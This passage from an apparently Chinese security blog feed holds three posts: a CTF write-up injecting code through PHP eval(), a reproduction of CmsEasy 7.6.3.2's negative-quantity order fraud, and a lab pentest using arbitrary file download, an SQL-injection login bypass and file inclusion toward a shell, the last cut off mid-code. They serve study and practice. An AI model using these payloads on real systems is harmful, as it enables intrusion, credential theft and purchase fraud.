<pre class="line-numbers language-none"><code class="language-none">function string2array($data)&#123;undefined

if($data &#x3D;&#x3D; &#39;&#39;)&#123;undefined
	return array();
&#125;
	eval(&quot;\$array &#x3D; $data;&quot;)
	return $array;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里必须使用eval函数才能将“字符串”变成一个真正的数组</p>
</blockquote>
<p>好家伙，直接给答案了相当于。所以这边 String2Array($data) 这个函数要想利用data得到一个数组。更全面的：将GET方法传的参数编程数组之后通过<code>eval()</code>函数进行赋值给另外一个变量，但是这里将字符串转换成数组的过程没有进行任何过滤，导致输入的内容很容易就逃逸出数组的范围，造成任意命令执行。</p>
<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><p>再来观察观察字符赋值的内容：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrvalue</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'array('</span><span class="token punctuation">;</span>
        <span class="token variable">$attrids</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$attrids</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"=>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$attrvalue</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$attrids</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先我们应该知道的是，在php中点 <code>.</code> 的意思为“连接”，指的是字符串连接符，可以用来将两个或两个以上的字符串拼接在一起，形成一个新的字符串；具体语法格式为：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$string</span> <span class="token operator">=</span> string1<span class="token operator">.</span>string2<span class="token operator">.</span>string3<span class="token operator">.</span> ······ <span class="token operator">.</span>stringn<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>还应该知道在php中数组默认键名是整数，也可以自己定义任意字符键名（最好是有实际意义），如：　</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$css</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'style'</span><span class="token operator">=></span><span class="token string single-quoted-string">'0'</span>，<span class="token string single-quoted-string">'color'</span><span class="token operator">=></span><span class="token string single-quoted-string">'green'</span><span class="token punctuation">)</span>；
则<span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'style'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'0'</span>，<span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'green'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>所以上面这段代码也就明了了，通过循环将传入的两个数组进行字符串的拼接来构成一个生成数组的字符串。但是我们通过观察发现，如果传入<code>&quot;);//</code>这样的方式，就能够把数组闭合起来，而且还能将后面的内容给注释掉，相当于SQL注入闭合掉拼接的语句那样：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$attrstr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"xxxxx);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>更进一步在<code>;</code>后面输入另外一条语句，如<code>&quot;);phpinfo();//</code>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$attrstr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"xxxxx);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这么一来就能够任意代码执行了，转化为payload即为：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>attrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>attrvalue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>于打印出php的信息中，CTRL+F调出搜索框搜索即可找到flag</p>
<p><img src="/2022/04/21/DASCTF-Oct-X-%E8%BF%B7%E8%B7%AF%E7%9A%84%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3/image-20220421212817263.png" alt="image-20220421212817263" loading="lazy"></p>
<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>Tokyo flag{211eecb4-39db-4e2b-b404-402ff5442b0f}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>CmsEasy7.6.3.2逻辑漏洞</title>
    <url>/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>在CmsEasy7.6.3.2版本中,存在<strong>订单金额任意修改</strong>逻辑漏洞，攻击者利用业务逻辑层的应用安全问题，在提交订单时抓取数据包并修改，以及对订单的数量进行任意修改（打到资本家！）。此漏洞可能造成企业的资产损失和名誉受损，传统的安全防御设备和措施收效甚微，危害还是比较大的捏。</p>
<span id="more"></span>

<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>通过phpstudy（以下简称为小皮）搭建网站后用burpsuite抓包修改数据从而复现漏洞</p>
<h2 id="phpstudy搭建网站"><a href="#phpstudy搭建网站" class="headerlink" title="phpstudy搭建网站"></a>phpstudy搭建网站</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>这是网站源码的压缩包：<a href="https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.6.3.2_UTF-8_20200422.zip">https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.6.3.2_UTF-8_20200422.zip</a></p>
<p>我们下载之后就可以开始搭建了</p>
<h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><p>首先将下载的压缩包解压到小皮的网站根目录下，以我的为例，即<code>D:\phpstudy_pro\WWW</code>。可以把解压之后的文件夹重命名，这样好记且有便于后续的操作，我把它改成了<code>cmseasy</code>。之后进入小皮的网站模块，点击创建网站，域名改为重命名之后的名字（没改的话就将域名设为你根目录下的名字）。</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422124346593.png" alt="image-20220422124346593" loading="lazy"></p>
<p>这样网站就搭好了，之后点击管理—&gt;打开网站，现在配置MySQL。数据库名设为<code>cmseasy</code>，之后的mysql用户名和密码就是自己的用户名和密码（如果忘了可以看小皮的数据库模块，里面有记录）。点击测试链接会显示连接成功。</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422124849819.png" alt="image-20220422124849819" loading="lazy"></p>
<p>再来注册一个管理员账户，这边随便设置就行了，为的是我们后续利用漏洞来白嫖需要有一个账号。这边我就把用户名和密码都设成了<code>admin</code>。之后开始安装就可以了。</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422125045469.png" alt="image-20220422125045469" loading="lazy"></p>
<h2 id="Burpsuite抓包"><a href="#Burpsuite抓包" class="headerlink" title="Burpsuite抓包"></a>Burpsuite抓包</h2><h3 id="开始白嫖"><a href="#开始白嫖" class="headerlink" title="开始白嫖"></a>开始白嫖</h3><p>网站搭建完成之后，进入网站首页。点击右上角登录，账号密码就是刚刚注册的，之后点击会员中心查看，可以看到我们现在全部家当只有100元。</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422125326754.png" alt="image-20220422125326754" loading="lazy"></p>
<p>怎么白嫖呢？我们点击精选产品模块，随便选一个商品，比如我选了MackBook（这也太盗版了亿点），数量随便选，点击购买抓包。</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422125459961.png" alt="image-20220422125459961" loading="lazy"></p>
<p>将抓到的包的<code>thisnum</code>数据改为负数（比如我这边改成了-5，原来是3就是我选择的购买数量），之后forward放包，关闭抓包。</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422125823435.png" alt="image-20220422125823435" loading="lazy"></p>
<p>会发现页面自动跳转到支付页面，然后它的价格变成了负数！资本家的羊毛你也敢薅！</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422130031125.png" alt="image-20220422130031125" loading="lazy"></p>
<p>之后填写联系方式，选择余额支付，点击购买，提示购买成功。</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422130130303.png" alt="image-20220422130130303" loading="lazy"></p>
<p>最后进入个人中心再次查看，会发现我们的订单完成，而且账户余额也正确显示了。这波啊，不仅是白嫖，是薅了资本家的羊毛，他还笑嘻嘻地说薅得好！</p>
<p><img src="/2022/04/22/CmsEasy7-6-3-2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20220422130227885.png" alt="image-20220422130227885" loading="lazy"></p>
<h1 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h1><p>1、升级到7.6.3.2以上版本</p>
<p>2、订单多重验证</p>
<p>3、数额巨大时采用人工验证</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>whoami靶场渗透测试</title>
    <url>/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>靶机：云演考试题，whoami靶机（源码没有找到没有在本地搭）</p>
<p>攻击机：kali</p>
<span id="more"></span>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>开始时访问网站发现啥信息也没有</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202955993.png" alt="image-20220426202955993" loading="lazy"></p>
<h2 id="获取靶机ip"><a href="#获取靶机ip" class="headerlink" title="获取靶机ip"></a>获取靶机ip</h2><p>windows 终端 ping 即可</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202134496.png" alt="image-20220426202134496" loading="lazy"></p>
<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p>kali 机使用 <code>nmap -sS + ip</code> 扫描得到靶机开放端口</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202320000.png" alt="image-20220426202320000" loading="lazy"></p>
<h2 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h2><p>一开始用御剑扫，字典太小了导致啥也没扫到，robots.txt 里面的 flag 提交上去还是错的</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202540195.png" alt="image-20220426202540195" loading="lazy"></p>
<p>后来用 kali 的 <code>dirb + url</code> 扫描，扫到了有一个 <code>www</code> 目录，然后呢用 <code>dirb + url</code>扫这个目录又扫不出东西了</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202710842.png" alt="image-20220426202710842" loading="lazy"></p>
<p>说是这么说，还是扫到东西了的，最关键的当属<code>phpmy</code>目录，<code>images</code>和<code>upload_images</code>咱都没权限访问</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426205430506.png" alt="image-20220426205430506" loading="lazy"></p>
<p>于是又转到御剑，发现文件都藏在这目录下了</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426203227826.png" alt="image-20220426203227826" loading="lazy"></p>
<h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><p>首先访问 <code>www</code></p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426214127779.png" alt="image-20220426214127779" loading="lazy"></p>
<p>尝试进行sql注入攻击，测试语句为万能密码：<code>’ or 1=1 --</code><br>后续还尝试了一些弱口令以及暴力破解，但测试结果都是try again。不知道过滤规则暂时放弃sql注入。</p>
<p>接着一个个访问此目录下的文件，发现其中 <code>head.php、show.php、c.php</code>分别是照片、空白、空白。而 <code>add.php</code> 是文件上传页面，但是尝试上传图片之后并没有回显地址，暂时作罢。值得注意的是 <code>test.php</code>，乍一看没啥，但是查看网页源代码发现</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426203719254.png" alt="image-20220426203719254" loading="lazy"></p>
<h2 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html">'file' parameter is empty. Please provide file path in 'file' parameter <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>提示“file”参数为空，请在“file”参数中提供文件路径。这是我们打开新世界大门的关键。</p>
<p>给test.php页面一个file参数<br>首先考虑是GET方式：<code>http://28e7134f.lxctf.net/www/test.php?file=/etc/passwd</code> ，无果<br>其次考虑POST方式，使用hackbar页面会显示下载该文件。结合burp使用可以直接看到文件的内容：</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426204726095.png" alt="image-20220426204726095" loading="lazy"></p>
<h3 id="获取数据库账号密码"><a href="#获取数据库账号密码" class="headerlink" title="获取数据库账号密码"></a>获取数据库账号密码</h3><p>由上述测试可知，test.php存在文件下载漏洞。我们如法炮制的看看其他文件内容，比如我们通过下载 <code>c.php</code>看到了数据库的账号<code>whoami</code>，密码<code>whoami_hacker</code>，以及数据库名<code>ica_lab</code></p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426205756732.png" alt="image-20220426205756732" loading="lazy"></p>
<p>数据库登录后台文件是啥呢？就是前面扫到的phpmy，登陆访问</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426210032836.png" alt="image-20220426210032836" loading="lazy"></p>
<p>看到ica_lab数据库，访问auth看到有一个账号密码。猜测是前面的登陆密码。</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426210755198.png" alt="image-20220426210755198" loading="lazy"></p>
<p>同时发现了flag，但是这个也是错的。</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426212140309.png" alt="image-20220426212140309" loading="lazy"></p>
<h3 id="知晓sql注入绕过方式"><a href="#知晓sql注入绕过方式" class="headerlink" title="知晓sql注入绕过方式"></a>知晓sql注入绕过方式</h3><p>同样利用前面的文件下载漏洞，下载www目录下的index.php文件，它涉及到前端sql注入的绕过方式</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这边str_replace的作用是将字符串 \ ‘ 替换为空，因此构造SQL注入登录payload时，必须含有 \ ‘ 字符串，否则会报错。urldecode的作用是将输入解码。我们在之前的payload：’ or 1&#x3D;1– 做出修改，在最后增加 \ ‘，str_replace会将这个\ ‘ 替换为空，所以相当于没加。</p>
<h3 id="登录前端"><a href="#登录前端" class="headerlink" title="登录前端"></a>登录前端</h3><p>此刻我们就有两种方法登录了</p>
<p>由于我们在数据库中获取了账号密码，直接登陆即可</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426214525298.png" alt="image-20220426214525298" loading="lazy"></p>
<p>第二种利用上述的sql注入，账号密码均输入<code>&#39; or 1=1 -- /&#39;</code>，也可成功登录（这边我靶机到期重启了一下，域名换了，不过无伤大雅）</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426214658674.png" alt="image-20220426214658674" loading="lazy"></p>
<h2 id="文件上传-包含漏洞getshell"><a href="#文件上传-包含漏洞getshell" class="headerlink" title="文件上传+包含漏洞getshell"></a>文件上传+包含漏洞getshell</h2><p>登陆成功进入 <code>panel.php</code> 页面，首先查看show users模块，发现与数据库中的users模块一致</p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427110230267.png" alt="image-20220427110230267" loading="lazy"></p>
<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427110304333.png" alt="image-20220427110304333" loading="lazy"></p>
<p>再看看add user模块，让我们上传文件，我们跟前面一样利用任意文件下载看看它的后端代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'continue'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$choice</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$choice</span><span class="token operator">===</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
       		<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$choice</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$choice</span><span class="token operator">===</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>       
		<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$choice</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过代码审计可知此文件存在文件包含漏洞，可以利用文件上传+包含的思路getshell</p>
<p>其次观察到，只允许我们上传图片类的文件，属于白名单问题，可以利用图片马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token variable">$name</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$address</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token variable">$iname</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$r</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$image</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">,</span><span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token variable">$finfo</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token variable">$filetype</span> <span class="token operator">=</span> @<span class="token variable">$finfo</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image\/jpeg/'</span><span class="token punctuation">,</span><span class="token variable">$filetype</span> <span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image\/png/'</span><span class="token punctuation">,</span><span class="token variable">$filetype</span> <span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image\/gif/'</span><span class="token punctuation">,</span><span class="token variable">$filetype</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token punctuation">&#123;</span>
